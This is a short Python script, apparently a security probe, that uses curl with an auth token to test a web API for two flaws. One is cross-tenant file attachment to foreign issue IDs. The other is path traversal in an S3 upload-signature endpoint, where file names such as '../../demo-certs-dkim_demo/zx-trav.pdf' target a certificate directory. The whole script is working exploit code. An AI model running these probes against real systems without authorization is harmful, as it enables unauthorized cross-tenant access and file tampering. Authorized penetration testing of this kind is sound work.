import json,subprocess,os
H=os.environ['H']; T=os.environ['T']; BB=os.environ['BB']
def req(method,path,body=None):
    cmd=['curl','-s','-m','40','-o','/tmp/b','-w','%{http_code}','-X',method,H+path,
         '-H','token: '+T,'-H',BB,'-H','Content-Type: application/json']
    if body is not None: cmd+=['-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()

print("=== A. cross-tenant fileable_id (attach my file into foreign issue ids) ===")
for iid in [121, 122, 169, 336, 999999]:
    c,b=req('POST','/api/v1/files/copy_files_to_fileable',
            {"fileable_id":iid,"fileable_type":"Issue","file_ids":[2691]})
    ok=''
    try:
        d=json.loads(b); f=d['files'][0]; ok=f"new_id={f.get('id')} fileable_id={f.get('fileable_id')} type={f.get('fileable_type')}"
    except Exception as e: ok=b[:200]
    print(f"  Issue {iid}: {c} {ok}")

print("\n=== B. s3_upload_signature path traversal ===")
for fn in ["zx-normal.pdf","../../demo-certs-dkim_demo/zx-trav.pdf","..%2f..%2fdemo-certs-dkim_demo%2fzx-t2.pdf"]:
    c,b=req('POST','/api/v1/files/s3_upload_signature',
            {"file_name":fn,"model_name":None,"model_id":None,"content_hash":"x"})
    print(f"  {fn}: {c} {b[:300]}")
